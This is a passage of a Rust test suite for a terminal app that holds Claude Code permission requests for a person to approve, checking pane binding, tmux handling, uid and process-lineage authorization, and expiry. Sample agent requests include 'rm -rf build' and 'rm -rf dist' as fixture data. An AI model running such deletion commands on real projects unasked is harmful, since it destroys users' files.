        let (mut client, answering) = conversation_in(&lanes, holding(), Duration::from_secs(5));
        client.send(&asking);
        let reply = client.reply().expect("refused, not dropped");
        assert_eq!(refused(&reply), code::BUSY);
        assert!(
            reply.error.expect("a refusal").message.contains("16"),
            "the refusal says how many"
        );
        answering.join().expect("the connection's thread");

        // The questions' lane is its own: a wait still has room, and so does
        // a question asked once one has gone.
        let (registering, registered) = std::sync::mpsc::channel();
        let (mut client, answering) =
            conversation_in(&lanes, holding_saying(registering), Duration::from_secs(5));
        client.send(&protocol::request_line(
            &Verb::PaneWait(Wait {
                pane: 7,
                until: Until::Idle,
                timeout: Some(60),
            }),
            None,
        ));
        registered
            .recv_timeout(Duration::from_secs(10))
            .expect("the wait reached the window");
        drop(client);
        answering.join().expect("the connection's thread");
        let (client, answering) = held_open.pop().expect("one held");
        drop(client);
        answering.join().expect("the connection's thread");
        let (mut client, answering) = conversation_in(&lanes, holding(), Duration::from_secs(5));
        client.send(&asking);
        held(&client.reply().expect("held"));
        drop(client);
        answering.join().expect("the connection's thread");
        for (client, answering) in held_open {
            drop(client);
            answering.join().expect("the connection's thread");
        }
    }

    #[test]
    fn a_question_from_another_user_is_refused_as_unauthorized() {
        let (mine, _theirs) = UnixStream::pair().expect("a pair");
        let asker = server::asker(&mine, server::euid()).expect("this user's");
        assert_eq!(asker.lineage.first(), Some(&std::process::id()));
        // No test can connect as somebody else, so it asks as the next uid.
        let refusal = server::asker(&mine, server::euid() + 1).expect_err("not this user");
        assert_eq!(refusal.code, code::UNAUTHORIZED);
    }

    #[test]
    fn an_ask_binds_to_the_pane_whose_terminal_it_names() {
        let mut served = Served::new(|workspace, ctx, _| {
            workspace.apply(TabAction::New, ctx);
        });
        let (first, second) = served.read(|workspace, _| {
            let mut panes = workspace.tabs().panes().map(|(_, pane)| pane.id());
            (panes.next().expect("one"), panes.next().expect("two"))
        });
        assert_ne!(served.tty(first), served.tty(second), "two ptys");

        // Asked with the first pane's token, naming the second's terminal:
        // the terminal is what binds it.
        let token = served.token(first);
        let (_client, reply) = served.ask_as(question("s1", served.tty(second), "ls"), Some(token));
        let id = held(&reply);
        served.read(|workspace, _| {
            let ask = workspace
                .asks()
                .in_pane(second)
                .expect("held in the second pane");
            assert_eq!(ask.id.as_u64(), id);
            assert_eq!(ask.request.command(), Some("ls"));
            assert!(workspace.asks().in_pane(first).is_none());
        });
        // And the numbers go up and are never handed out again.
        let (_again, reply) = served.ask_as(question("s2", served.tty(second), "ls"), None);
        assert!(held(&reply) > id);
    }

    #[test]
    fn an_ask_naming_no_pane_of_this_window_is_refused() {
        let mut served = Served::new(|_, _, _| {});
        let pane = first_pane(&served);
        let elsewhere = served.tty(pane).wrapping_add(1000);
        let (_client, reply) = served.ask_as(question("s1", elsewhere, "ls"), None);
        assert_eq!(refused(&reply), code::NO_SUCH_PANE);
        assert_eq!(served.asks(), 0);
    }

    /// A question about `command` from `session` inside tmux, whose clients
    /// are on the terminals numbered `clients`.
    fn from_tmux(session: &str, clients: Vec<u32>, command: &str) -> AgentAsk {
        AgentAsk {
            session: session.to_owned(),
            tty: None,
            multiplexer: Some(protocol::Multiplexer {
                kind: protocol::MultiplexerKind::Tmux,
                clients,
                pane: "%3".to_owned(),
            }),
            ..agent_ask(command)
        }
    }

    /// What the window answers a `pane.find` for `ttys`.
    fn finds(served: &mut Served, ttys: Vec<u32>) -> Reply {
        served.ask(move |socket| {
            let mut client = Client::connect(&socket);
            client.send(&protocol::request_line(
                &Verb::PaneFind(protocol::Find { ttys }),
                None,
            ));
            client.reply().expect("the window replies")
        })
    }

    #[test]
    fn a_question_from_inside_tmux_binds_to_the_first_pane_holding_a_client() {
        let mut served = Served::new(|workspace, ctx, _| {
            workspace.apply(TabAction::New, ctx);
            workspace.apply(TabAction::New, ctx);
        });
        let panes: Vec<PaneId> = served.read(|workspace, _| {
            workspace
                .tabs()
                .panes()
                .map(|(_, pane)| pane.id())
                .collect()
        });
        let [first, second, third] = panes[..] else {
            panic!("three panes: {panes:?}");
        };
        // The clients named last first, and a terminal no pane is on: the
        // panel's order decides, and the token of another pane, which a
        // tmux server keeps from wherever it started, changes nothing.
        let clients = vec![served.tty(third), 7, served.tty(second)];
        let (_client, reply) =
            served.ask_as(from_tmux("s1", clients, "ls"), Some(served.token(first)));
        let id = held(&reply);
        served.read(|workspace, _| {
            let ask = workspace
                .asks()
                .in_pane(second)
                .expect("held in the second pane");
            assert_eq!(ask.id.as_u64(), id);
            // This test is under no tmux at all, whatever terminals it
            // names: shown, and read-only.
            assert_eq!(ask.cannot_answer, Some(CannotAnswer::NotFromItsTmux));
            let inside = ask.inside.as_ref().expect("from inside tmux");
            assert_eq!(inside.pane, "%3");
            assert_eq!(inside.said(), "inside tmux (also attached in 1 other tab)");
            assert_eq!(ask.summary, "Bash inside tmux: ls");
            assert!(workspace.asks().in_pane(third).is_none());
            assert!(workspace.asks().in_pane(first).is_none());
        });

        // Attached in one tab only, it says nothing of others.
        let (_alone, reply) = served.ask_as(from_tmux("s2", vec![served.tty(first)], "ls"), None);
        held(&reply);
        served.read(|workspace, _| {
            let ask = workspace
                .asks()
                .in_pane(first)
                .expect("held in the first pane");
            assert_eq!(
                ask.inside.as_ref().map(|inside| inside.said()).as_deref(),
                Some("inside tmux")
            );
        });

        // And clients no pane is on are no pane.
        let (_none, reply) = served.ask_as(from_tmux("s3", vec![7, 8], "ls"), None);
        assert_eq!(refused(&reply), code::NO_SUCH_PANE);
    }

    #[test]
    fn a_pane_find_says_only_whether_a_pane_is_on_one_of_the_terminals() {
        let mut served = Served::new(|_, _, _| {});
        let pane = first_pane(&served);
        let tty = served.tty(pane);
        let found = |reply: Reply| {
            assert!(reply.ok, "{reply:?}");
            reply.result.expect("a result")
        };
        assert_eq!(
            found(finds(&mut served, vec![7, tty])),
            json!({"found": true})
        );
        assert_eq!(found(finds(&mut served, vec![7])), json!({"found": false}));
        assert_eq!(served.asks(), 0, "nothing is held for a find");

        // A window not taking questions holds none of them.
        served.update(|workspace, ctx| workspace.take_agents_questions(false, ctx));
        assert_eq!(
            found(finds(&mut served, vec![tty])),
            json!({"found": false})
        );
    }

    #[test]
    fn a_fifth_ask_on_one_pane_is_busy() {
        let mut served = Served::new(|_, _, _| {});
        let pane = first_pane(&served);
        let tty = served.tty(pane);
        let mut clients = Vec::new();
        for session in ["s1", "s2", "s3", "s4"] {
            let (client, reply) = served.ask_as(question(session, tty, "ls"), None);
            held(&reply);
            clients.push(client);
        }
        let (_client, reply) = served.ask_as(question("s5", tty, "ls"), None);
        assert_eq!(refused(&reply), code::BUSY);
        assert_eq!(served.asks(), 4);
    }

    #[test]
    fn a_newer_ask_from_the_same_session_ends_the_older() {
        let mut served = Served::new(|_, _, _| {});
        let pane = first_pane(&served);
        let tty = served.tty(pane);
        let (mut older, reply) = served.ask_as(question("s1", tty, "rm -rf build"), None);
        let first = held(&reply);
        let (_other, reply) = served.ask_as(question("s2", tty, "ls"), None);
        let other = held(&reply);
        let (_newer, reply) = served.ask_as(question("s1", tty, "rm -rf dist"), None);
        let newer = held(&reply);

        assert_eq!(older.answer(), pass("asked-again"));
        assert_eq!(served.ended(first), Some(How::Ended(Cause::AskedAgain)));
        served.read(|workspace, _| {
            let held: Vec<u64> = workspace.asks().live().map(|ask| ask.id.as_u64()).collect();
            assert_eq!(held, vec![other, newer], "another session's is its own");
            assert_eq!(
                workspace
                    .asks()
                    .in_pane(pane)
                    .and_then(|ask| ask.request.command()),
                Some("rm -rf dist")
            );
        });
    }

    #[test]
    fn a_hook_that_hangs_up_takes_its_question_with_it() {
        let mut served = Served::new(|_, _, _| {});
        let pane = first_pane(&served);
        let (client, reply) = served.ask_as(question("s1", served.tty(pane), "ls"), None);
        let id = held(&reply);
        assert_eq!(served.asks(), 1);

        // Nothing else happens in the window: the hook going is the one
        // thing that can wake it, and it has to.
        drop(client);
        // Ended, and not only hidden: the frame stops showing a question
        // whose feed has closed, but only the notice waking the window ends
        // it.
        served.pump_until("the hook's question outlived the hook", |served| {
            served.ended(id).is_some()
        });
        assert_eq!(served.ended(id), Some(How::Ended(Cause::HookGone)));
        assert_eq!(served.asks(), 0);
    }

    #[test]
    fn an_ask_ends_with_pass_when_its_pane_closes_its_command_ends_or_its_turn_does() {
        let mut served = Served::new(|workspace, ctx, _| {
            workspace.apply(TabAction::New, ctx);
        });
        let (first, second) = served.read(|workspace, _| {
            let mut panes = workspace.tabs().panes().map(|(_, pane)| pane.id());
            (panes.next().expect("one"), panes.next().expect("two"))
        });
        let tty = served.tty(first);

        // The agent says its turn is over.
        let (mut client, reply) = served.ask_as(question("s1", tty, "ls"), None);
        let id = held(&reply);
        served.report(first, AgentStatus::Idle, None);
        assert_eq!(client.answer(), pass("turn-ended"));
        assert_eq!(served.ended(id), Some(How::Ended(Cause::TurnEnded)));

        // Or that it failed.
        let (mut client, reply) = served.ask_as(question("s1", tty, "ls"), None);
        let id = held(&reply);
        served.report(first, AgentStatus::Failed, Some("You've hit your limit"));
        assert_eq!(client.answer(), pass("turn-ended"));
        assert_eq!(served.ended(id), Some(How::Ended(Cause::TurnEnded)));

        // Its command ends, taking the agent's report back.
        let (mut client, reply) = served.ask_as(question("s1", tty, "ls"), None);
        let id = held(&reply);
        served.report(
            first,
            AgentStatus::NeedsInput,
            Some("permission to use Bash"),
        );
        served.update(|workspace, ctx| {
            workspace.apply_terminal_update(&TerminalUpdate::AgentSettled(first), ctx);
        });
        assert_eq!(client.answer(), pass("command-ended"));
        assert_eq!(served.ended(id), Some(How::Ended(Cause::CommandEnded)));

        // Its pane closes.
        let (mut client, reply) = served.ask_as(question("s1", served.tty(second), "ls"), None);
        let id = held(&reply);
        served.update(|workspace, ctx| {
            workspace.apply(TabAction::ClosePane(second), ctx);
        });
        assert_eq!(client.answer(), pass("pane-closed"));
        assert_eq!(served.ended(id), Some(How::Ended(Cause::PaneClosed)));
        assert_eq!(served.asks(), 0);
        // And the connection closes after the one answer.
        assert_eq!(client.raw(), None);
    }

    #[test]
    fn a_done_withdraws_only_the_matching_ask() {
        let mut served = Served::new(|workspace, ctx, _| {
            workspace.apply(TabAction::New, ctx);
        });
        let (first, second) = served.read(|workspace, _| {
            let mut panes = workspace.tabs().panes().map(|(_, pane)| pane.id());
            (panes.next().expect("one"), panes.next().expect("two"))
        });
        let answered = question("s1", served.tty(first), "touch probe-c9a");
        let done = crook_terminal::agent::Fingerprint::parse(&crate::agent::request::fingerprint(
            &answered.digest(),
        ))
        .expect("a fingerprint the wire carries");
        let (mut client, reply) = served.ask_as(answered.clone(), None);
        let id = held(&reply);
        // Another session's in the same pane, and the very same question
        // asked in another pane, which has the same fingerprint.
        let (_beside, reply) = served.ask_as(question("s2", served.tty(first), "ls"), None);
        let beside = held(&reply);
        let (_elsewhere, reply) = served.ask_as(
            AgentAsk {
                tty: Some(served.tty(second)),
                multiplexer: None,
                ..answered
            },
            None,
        );
        let elsewhere = held(&reply);

        // A fingerprint no question has ends nothing.
        let forged =
            crook_terminal::agent::Fingerprint::parse("0123456789abcdef0123456789abcdef").unwrap();
        served.update(|workspace, ctx| {
            workspace.apply_terminal_update(
                &TerminalUpdate::AskDone {
                    pane: first,
                    fingerprints: vec![forged],
                },
                ctx,
            );
        });
        assert_eq!(served.asks(), 3);

        served.update(|workspace, ctx| {
            workspace.apply_terminal_update(
                &TerminalUpdate::AskDone {
                    pane: first,
                    fingerprints: vec![done],
                },
                ctx,
            );
        });
        assert_eq!(client.answer(), pass("answered-in-agent"));
        assert_eq!(served.ended(id), Some(How::Ended(Cause::AnsweredInAgent)));
        assert_eq!(served.ended(beside), None);
        assert_eq!(served.ended(elsewhere), None, "another pane's is its own");
        assert_eq!(served.asks(), 2);
        served.read(|workspace, _| {
            let outcome = workspace
                .asks()
                .history()
                .find(|outcome| outcome.id.as_u64() == id)
                .expect("an ended question is remembered");
            let How::Ended(cause) = outcome.how else {
                panic!("{:?}", outcome.how);
            };
            assert_eq!(cause.said(), "Answered in the agent's own dialog");
        });
    }

    #[test]
    fn an_ask_ends_with_pass_when_its_wait_runs_out() {
        let mut served = Served::new(|_, _, _| {});
        let pane = first_pane(&served);
        let (client, reply) = served.ask_as(
            AgentAsk {
                wait: 1,
                ..question("s1", served.tty(pane), "ls")
            },
            None,
        );
        let id = held(&reply);
        let started = Instant::now();
        // The hook's read, on a thread of its own, while the window runs.
        let reading = thread::spawn(move || {
            let mut client = client;
            client.answer()
        });
        served.pump_until("the question never expired", |served| {
            served.ended(id).is_some()
        });
        assert_eq!(reading.join().expect("the hook"), pass("expired"));
        assert_eq!(served.ended(id), Some(How::Ended(Cause::Expired)));
        let took = started.elapsed();
        assert!(
            took >= Duration::from_secs(1) + server::ASK_MARGIN - Duration::from_millis(500),
            "expired early: {took:?}"
        );
    }

    #[test]
    fn an_ask_ends_with_gone_when_the_window_closes() {
        let mut served = Served::new(|_, _, _| {});
        let pane = first_pane(&served);
        let (mut client, reply) = served.ask_as(question("s1", served.tty(pane), "ls"), None);
        held(&reply);
        // Held past the time the connection had to be asked in, as every
        // question a person takes a moment over is.
        thread::sleep(server::DEADLINE + Duration::from_millis(500));
        let Served {
            window, control, ..
        } = served;
        drop(control);
        let reply = client.reply().expect("told, not hung up on");
        assert_eq!(refused(&reply), code::GONE);
        drop(window);
    }

    #[test]
    fn an_ask_survives_the_titles_asterisk_and_a_running_report() {
        let mut served = Served::new(|_, _, _| {});
        let pane = first_pane(&served);
        served.report(pane, AgentStatus::Running, None);
        let (_client, reply) = served.ask_as(question("s1", served.tty(pane), "ls"), None);
        held(&reply);
        // The `✳` Claude Code draws as the dialog opens is the moment it
        // asks; a parallel tool's hook still says running; the notification
        // that asks comes after.
        served.titled(pane, "✳ Port the tab bar");
        served.report(pane, AgentStatus::Running, None);
        served.titled(pane, "✳ Port the tab bar");
        served.report(
            pane,
            AgentStatus::NeedsInput,
            Some("permission to use Bash"),
        );
        assert_eq!(served.asks(), 1, "the question is still being asked");
    }

    #[test]
    fn a_token_naming_another_tab_or_a_stranger_pid_makes_it_read_only() {
        let mut served = Served::new(|workspace, ctx, _| {
            workspace.apply(TabAction::New, ctx);
        });
        let (first, second) = served.read(|workspace, _| {
            let mut panes = workspace.tabs().panes().map(|(_, pane)| pane.id());
            (panes.next().expect("one"), panes.next().expect("two"))
        });
        let tty = served.tty(first);

        // This test is no process of the pane's shell.
        let (_stranger, reply) = served.ask_as(question("s1", tty, "ls"), None);
        held(&reply);
        let cannot = |served: &Served| {
            served.read(|workspace, _| workspace.asks().in_pane(first).map(|ask| ask.cannot_answer))
        };
        assert_eq!(cannot(&served), Some(Some(CannotAnswer::NotFromThisTab)));
        // Nor is a hook holding another pane's token, whichever it is.
        let (_other, reply) = served.ask_as(question("s1", tty, "ls"), Some(served.token(second)));
        held(&reply);
        assert_eq!(cannot(&served), Some(Some(CannotAnswer::OtherTab)));
        // The pane's own token is not enough on its own.
        let (_own, reply) = served.ask_as(question("s1", tty, "ls"), Some(served.token(first)));
        held(&reply);
        assert_eq!(cannot(&served), Some(Some(CannotAnswer::NotFromThisTab)));

        // What decides it, from what the kernel said: below the pane's shell,
        // a pane here, its own token or none, is the only answerable one.
        let shell = served
            .read(|workspace, app| workspace.shell_pid(first, app))
            .expect("the pane's shell");
        let below = protocol::Asker {
            pid: Some(4242),
            lineage: vec![4242, shell, 1],
            ..Default::default()
        };
        let stranger = protocol::Asker {
            pid: Some(4242),
            lineage: vec![4242, 1],
            ..Default::default()
        };
        use super::super::ask::cannot_answer;
        assert_eq!(cannot_answer(None, first, &below, Some(shell), false), None);
        assert_eq!(
            cannot_answer(Some(first), first, &below, Some(shell), false),
            None
        );
        assert_eq!(
            cannot_answer(Some(second), first, &below, Some(shell), false),
            Some(CannotAnswer::OtherTab)
        );
        assert_eq!(
            cannot_answer(None, first, &stranger, Some(shell), false),
            Some(CannotAnswer::NotFromThisTab)
        );
        assert_eq!(
            cannot_answer(None, first, &below, None, false),
            Some(CannotAnswer::NotFromThisTab),
            "a pane whose shell cannot be named"
        );
        assert_eq!(
            cannot_answer(None, first, &below, Some(shell), true),
            Some(CannotAnswer::Remote)
        );
    }

    #[test]
    fn with_answering_off_an_ask_is_declined() {
        let mut served = Served::new(|workspace, ctx, _| {
            workspace.take_agents_questions(false, ctx);
        });
        let pane = first_pane(&served);
        let (_client, reply) = served.ask_as(question("s1", served.tty(pane), "ls"), None);
        assert_eq!(refused(&reply), code::DECLINED);
        assert_eq!(served.asks(), 0);
        // Before anything about the panes is said: a terminal no pane is on
        // is declined too.
        let (_client, reply) = served.ask_as(question("s1", 7, "ls"), None);
        assert_eq!(refused(&reply), code::DECLINED);
    }

    /// A conversation answered as a window would whose user is `uid`, asking
    /// `answer`: the listener's side, for a uid no test can connect as.
    fn conversation_as(answer: Answer, uid: u32) -> (Client, thread::JoinHandle<()>) {
        let lanes = Arc::new(Lanes::default());
        let (client, window) = UnixStream::pair().expect("a pair");
        let mut place = Place::take(&lanes).expect("a place among the connections answered");
        let answering = thread::spawn(move || {
            server::converse_as(
                &window,
                Instant::now() + Duration::from_secs(5),
                &*answer,
                &mut place,
                uid,
            );
        });
        (Client::on(client), answering)
    }

    /// A window that holds every question as number 1, and keeps what it was
    /// asked.
    fn remembering() -> (Answer, Arc<std::sync::Mutex<Vec<Request>>>) {
        let asked = Arc::new(std::sync::Mutex::new(Vec::new()));
        let kept = asked.clone();
        let answer: Answer = Arc::new(move |request: Request, _, _| {
            kept.lock().expect("not poisoned").push(request);
            Ok(json!({"asked": 1}))
        });
        (answer, asked)
    }

    #[test]
    fn a_question_from_another_user_never_reaches_the_window() {
        // Asked of a window whose user is the next uid up: the kernel says
        // this test is not that user, and the question is refused on the
        // connection's thread, before the window hears of it.
        let (answer, asked) = remembering();
        let (mut client, answering) = conversation_as(answer, server::euid() + 1);
        client.send(&protocol::request_line(
            &Verb::AgentAsk(agent_ask("ls")),
            None,
        ));
        let reply = client.reply().expect("refused, not dropped");
        assert_eq!(refused(&reply), code::UNAUTHORIZED);
        assert!(
            reply
                .error
                .expect("a refusal")
                .message
                .contains(&format!("uid {}", server::euid())),
            "the refusal names who asked"
        );
        answering.join().expect("the connection's thread");
        assert!(asked.lock().expect("not poisoned").is_empty());

        // Asked as this user, the window is handed who asked, as the kernel
        // said: this process, first in its own lineage.
        let (answer, asked) = remembering();
        let (mut client, answering) = conversation_as(answer, server::euid());
        client.send(&protocol::request_line(
            &Verb::AgentAsk(agent_ask("ls")),
            None,
        ));
        held(&client.reply().expect("held"));
        drop(client);
        answering.join().expect("the connection's thread");
        let asked = asked.lock().expect("not poisoned");
        let asker = asked[0]
            .asker
            .as_ref()
            .expect("the window is told who asked");
        assert_eq!(asker.lineage.first(), Some(&std::process::id()));
    }

    #[test]
    fn a_hook_is_heard_for_one_line_and_after_it_only_for_leaving() {
        use super::super::ask::AskId;

        let inbox = Arc::new(Inbox::default());
        let telling = inbox.clone();
        let answer: Answer = Arc::new(move |_, feed: Option<Arc<Feed>>, _| {
            feed.expect("a question is asked on a kept connection")
                .tell(Arc::downgrade(&telling));
            Ok(json!({"asked": 1}))
        });
        let (mut client, answering) = conversation(answer, Duration::from_secs(5));
        client.send(&protocol::request_line(
            &Verb::AgentAsk(agent_ask("ls")),
            None,
        ));
        held(&client.reply().expect("held"));

        // A hook that says it printed its answer once, and then again and
        // again: the window hears it once.
        for _ in 0..64 {
            client.send("{\"delivered\":true}\n");
        }
        let notices = || inbox.lock().notices.clone();
        let started = Instant::now();
        while notices().is_empty() {
            assert!(started.elapsed() < Duration::from_secs(10), "never heard");
            thread::sleep(Duration::from_millis(10));
        }
        // Long enough for every line after the first to have been read.
        thread::sleep(Duration::from_millis(300));
        assert_eq!(notices(), [Notice::Delivered(AskId::from_wire(1))]);

        // And its leaving, once.
        drop(client);
        answering.join().expect("the connection's thread");
        assert_eq!(
            notices(),
            [
                Notice::Delivered(AskId::from_wire(1)),
                Notice::Withdrawn(AskId::from_wire(1))
            ]
        );
    }

    #[test]
    fn a_question_the_window_was_too_slow_to_hold_is_never_held() {
        let mut served = Served::new(|_, _, _| {});
        let pane = first_pane(&served);
        let tty = served.tty(pane);
        let socket = served.socket();
        // Asked while the window draws nothing — a frame stalled for longer
        // than the connection waits on it — so the connection gives up and
        // the hook passes.
        let asking = thread::spawn(move || hook(question("s1", tty, "ls"), None)(socket));
        let (_client, reply) = asking.join().expect("the hook");
        assert_eq!(refused(&reply), code::TIMEOUT);

        // Then the window catches up, and is handed the question at last.
        for _ in 0..5 {
            served.window.queue.run_until_parked();
            thread::sleep(Duration::from_millis(20));
        }
        // A settle, which drops a question nobody waits on: there is none,
        // as there was never one held.
        served.update(|workspace, ctx| {
            workspace.apply(TabAction::New, ctx);
        });
        assert_eq!(served.asks(), 0);
        served.read(|workspace, _| {
            assert_eq!(
                workspace.asks().history().count(),
                0,
                "a question was held after its hook had passed"
            );
        });
    }

    /// Set, for the test binary run again below a pane's shell, to say it is
    /// to ask as the hook does.
    #[cfg(any(target_os = "linux", target_os = "macos"))]
    const CHILD_ASKS: &str = "CROOK_TEST_ASK_AS_A_HOOK";

    /// The hook, run as Claude Code runs it in a pane: this test binary
    /// again, started by the pane's shell, reading the request from its
    /// standard input, with the pane's environment. Nothing unless the test
    /// below started it.
    #[cfg(any(target_os = "linux", target_os = "macos"))]
    #[test]
    #[ignore = "run by a_hook_below_the_panes_shell_asks_a_question_the_window_could_answer"]
    fn asks_as_a_hook_below_a_panes_shell() {
        if std::env::var_os(CHILD_ASKS).is_some() {
            crate::agent::ask::run(std::iter::once("claude".to_owned()));
        }
    }

    #[cfg(any(target_os = "linux", target_os = "macos"))]
    #[test]
    fn a_hook_below_the_panes_shell_asks_a_question_the_window_could_answer() {
        use std::os::unix::ffi::OsStrExt;

        let root = TempDir::new();
        let gate = root.0.join("gate");
        let input = root.0.join("input.json");
        fs::write(
            &input,
            json!({
                "session_id": "4f1c2b7e-0d3a-4e5f-9a8b-7c6d5e4f3a2b",
                "cwd": "/home/someone/work/crook",
                "hook_event_name": "PermissionRequest",
                "tool_name": "Bash",
                "tool_input": {"command": "rm -rf build"},
            })
            .to_string(),
        )
        .expect("the input is written");
        let binary = std::env::current_exe().expect("the test binary has a path");
        let quoted = |path: &Path| {
            let text = std::str::from_utf8(path.as_os_str().as_bytes()).expect("text");
            assert!(!text.contains('\''), "a path the script can quote: {text}");
            format!("'{text}'")
        };
        // The pane's shell runs the hook as a child of its own, as an
        // agent's would be a grandchild, out of any multiplexer the suite
        // runs in, and is then a pane like any other.
        let program = root.0.join("sh");
        crate::process::write_program(
            &program,
            &format!(
                "#!/bin/sh\n\
                 while [ ! -e {gate} ]; do sleep 0.1; done\n\
                 TMUX= STY= ZELLIJ= CLAUDE_CODE_ENTRYPOINT=cli {CHILD_ASKS}=1 {binary} --exact \
                 control::tests::socket::asks_as_a_hook_below_a_panes_shell --ignored \
                 --test-threads=1 < {input}\n\
                 exec cat\n",
                gate = quoted(&gate),
                binary = quoted(&binary),
                input = quoted(&input),
            ),
        );
        let shell = GatedShell { program, gate };
        let mut served = Served::with(root, shell, |_, _, _| {});
        let pane = first_pane(&served);
        served.shell.open();

        served.pump_until("the hook below the pane's shell never asked", |served| {
            served.asks() == 1
        });
        let (id, shell) = served.read(|workspace, app| {
            let ask = workspace.asks().in_pane(pane).expect("held in its pane");
            assert_eq!(ask.request.command(), Some("rm -rf build"));
            assert_eq!(
                ask.cannot_answer, None,
                "a process the pane's shell started, with the pane's token, on the pane's \
                 terminal, is one this window could answer"
            );
            (ask.id, workspace.shell_pid(pane, app))
        });
        assert!(shell.is_some(), "the pane's shell is running");

        // Ended, so the hook passes and the shell goes on.
        served.update(|workspace, _| {
            workspace.asks_mut().end(id, Cause::TurnEnded);
        });
        assert_eq!(
            served.ended(id.as_u64()),
            Some(How::Ended(Cause::TurnEnded))
        );
    }

    /// The whole road, end to end: a hook below a pane's shell asks over the
    /// socket `Control::open_in` opened, a person opens the card, waits out
    /// its second and presses Allow once, and the hook prints Claude Code's
    /// allow, byte for byte, and says it did.
    #[cfg(any(target_os = "linux", target_os = "macos"))]
    #[test]
    fn allow_on_the_card_is_what_the_hook_prints() {
        use std::os::unix::ffi::OsStrExt;

        use crate::workspace::{AskAction, Pressed};

        let root = TempDir::new();
        let gate = root.0.join("gate");
        let input = root.0.join("input.json");
        let printed = root.0.join("printed");
        fs::write(
            &input,
            json!({
                "session_id": "4f1c2b7e-0d3a-4e5f-9a8b-7c6d5e4f3a2b",
                "cwd": "/home/someone/work/crook",
                "hook_event_name": "PermissionRequest",
                "tool_name": "Bash",
                "tool_input": {"command": "rm -rf build", "description": "Clean the build"},
            })
            .to_string(),
        )
        .expect("the input is written");
        let binary = std::env::current_exe().expect("the test binary has a path");
        let quoted = |path: &Path| {
            let text = std::str::from_utf8(path.as_os_str().as_bytes()).expect("text");
            assert!(!text.contains('\''), "a path the script can quote: {text}");
            format!("'{text}'")
        };
        // Quiet, so that what the harness itself prints is a dot and a
        // summary around the hook's one line rather than a line it shares.
        let program = root.0.join("sh");
        crate::process::write_program(
            &program,
            &format!(
                "#!/bin/sh\n\
                 while [ ! -e {gate} ]; do sleep 0.1; done\n\
                 TMUX= STY= ZELLIJ= CLAUDE_CODE_ENTRYPOINT=cli {CHILD_ASKS}=1 {binary} --exact \
                 control::tests::socket::asks_as_a_hook_below_a_panes_shell --ignored \
                 --test-threads=1 -q < {input} > {printed}\n\
                 exec cat\n",
                gate = quoted(&gate),
                binary = quoted(&binary),
                input = quoted(&input),
                printed = quoted(&printed),
            ),
        );
        let shell = GatedShell { program, gate };
        let mut served = Served::with(root, shell, |_, _, _| {});
        let pane = first_pane(&served);
        served.shell.open();

        served.pump_until("the hook below the pane's shell never asked", |served| {
            served.asks() == 1
        });
        let (id, digest) = served.read(|workspace, _| {
            let ask = workspace.asks().in_pane(pane).expect("held in its pane");
            assert_eq!(ask.cannot_answer, None);
            (ask.id, ask.digest)
        });
        served.update(|workspace, ctx| {
            workspace.answer_waiting_agent(ctx);
            workspace.settle_the_ask_card(ctx);
            // This window draws no frame, so nothing lays the command out:
            // one line, and on screen, as a frame would have found it.
            workspace.read_the_ask_card_to_its_end();
            workspace.handle_action(
                &AskAction::Answer {
                    ask: id,
                    digest,
                    decision: Choice::Allow,
                    by: Pressed::Pointer,
                }
                .into(),
                ctx,
            );
        });
        served.pump_until("the hook never said it printed the answer", |served| {
            served.read(|workspace, _| {
                workspace
                    .asks()
                    .outcome(id)
                    .is_some_and(|outcome| outcome.delivered)
            })
        });
        assert_eq!(
            served.ended(id.as_u64()),
            Some(How::Answered(Choice::Allow))
        );
        let out = fs::read_to_string(&printed).expect("the hook's output");
        let lines: Vec<&str> = out
            .split_inclusive('\n')
            .filter(|line| line.starts_with('{'))
            .collect();
        assert_eq!(lines, [crate::agent::ask::ALLOW], "{out:?}");
    }

    /// A tmux server of a window test's own, on a socket under the test's
    /// directory, killed when this is dropped — a test that fails half way
    /// leaves no server behind.
    #[cfg(any(target_os = "linux", target_os = "macos"))]
    struct TestTmux {
        /// Its `TMUX_TMPDIR`.
        directory: PathBuf,
        /// Its `-L` name.
        name: &'static str,
    }

    #[cfg(any(target_os = "linux", target_os = "macos"))]
    impl TestTmux {
        /// `None`, saying so, where no tmux runs; on CI, where a skip would
        /// be a pass for the wrong reason, a failure instead.
        fn here() -> bool {
            let here = crate::process::command("tmux")
                .arg("-V")
                .stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::null())
                .status()
                .is_ok_and(|status| status.success());
            assert!(
                here || std::env::var_os("CI").is_none(),
                "no tmux, which these tests run for real"
            );
            if !here {
                eprintln!("skipped: no tmux to run");
            }
            here
        }

        /// The words that start a `tmux` of this server's, for a script.
        fn command(&self) -> String {
            format!(
                "TMUX= TMUX_TMPDIR='{}' TERM=xterm-256color tmux -L {} -f /dev/null",
                self.directory.display(),
                self.name
            )
        }

        /// Runs the tmux command `rest` on this server, beside it.
        fn run(&self, rest: &[&str]) -> String {
            let output = crate::process::command("tmux")
                .env("TMUX_TMPDIR", &self.directory)
                .env_remove("TMUX")
                .args(["-L", self.name])
                .args(rest)
                .stdin(std::process::Stdio::null())
                .stderr(std::process::Stdio::null())
                .output();
            output
                .map(|output| String::from_utf8_lossy(&output.stdout).into_owned())
                .unwrap_or_default()
        }
    }

    #[cfg(any(target_os = "linux", target_os = "macos"))]
    impl Drop for TestTmux {
        fn drop(&mut self) {
            self.run(&["kill-server"]);
        }
    }

    /// What a pane's shell does in a tmux test: waits for the gate, says
    /// which terminal it is on, and becomes a tmux client — or, with
    /// `under_perl`, runs one as a child of `perl`, so that the pane's
    /// foreground is not tmux — of a server started there, whose one pane
    /// runs `pane.sh`. Every pane after the first becomes a client of
    /// `other`, whose pane runs nothing.
    #[cfg(any(target_os = "linux", target_os = "macos"))]
    fn tmux_shell(
        root: &TempDir,
        tmux: &TestTmux,
        other: &TestTmux,
        under_perl: bool,
    ) -> GatedShell {
        let program = root.0.join("sh");
        let gate = root.0.join("gate");
        let wrapper = if under_perl {
            "perl -e 'exit(system(@ARGV) >> 8)' --"
        } else {
            ""
        };
        crate::process::write_program(
            &program,
            &format!(
                "#!/bin/sh\n\
                 while [ ! -e '{gate}' ]; do sleep 0.1; done\n\
                 if ! mkdir '{root}/first' 2>/dev/null; then\n\
                 exec env {other} new-session 'exec sleep 600'\n\
                 fi\n\
                 tty > '{root}/pane-tty'\n\
                 exec {wrapper} env {tmux} new-session \"sh '{root}/pane.sh'\"\n",
                gate = gate.display(),
                root = root.0.display(),
                tmux = tmux.command(),
                other = other.command(),
            ),
        );
        GatedShell { program, gate }
    }

    /// Writes `pane.sh`: the hook, run as Claude Code runs it in tmux's pane
